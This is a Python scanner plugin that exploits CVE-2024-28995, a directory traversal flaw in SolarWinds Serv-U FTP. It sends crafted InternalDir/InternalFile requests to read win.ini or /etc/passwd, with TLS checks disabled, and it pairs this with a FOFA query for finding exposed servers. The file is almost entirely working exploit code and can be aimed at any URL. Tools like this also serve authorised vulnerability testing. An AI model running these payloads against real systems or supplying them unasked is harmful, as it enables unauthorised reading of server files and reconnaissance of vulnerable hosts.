#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/VGAGyxQZZuqjCUkP1IOXIw',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'SolarWinds Serv-U FTP 目录遍历文件读取漏洞 CVE-2024-28995',

      'level'     :   'medium',

      'FOFA'      :   'app="SolarWinds-Serv-U-FTP"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/6/18',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': '*/*',
      'Accept-Language': 'en',
      'Accept-Encoding': 'gzip',
      }
  target1 = '/?InternalDir=/../../../../windows&InternalFile=win.ini'
  url1 = url + target1
  ret['url'] = url1
  target2 = r'/?InternalDir=\..\..\..\..\etc&InternalFile=passwd'
  url2 = url + target2
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    # print(res.text)
    if res.status_code == 200 and re.search(r'for 16-bit app support',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    res=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    # print(res.text)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['url'] = url2
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret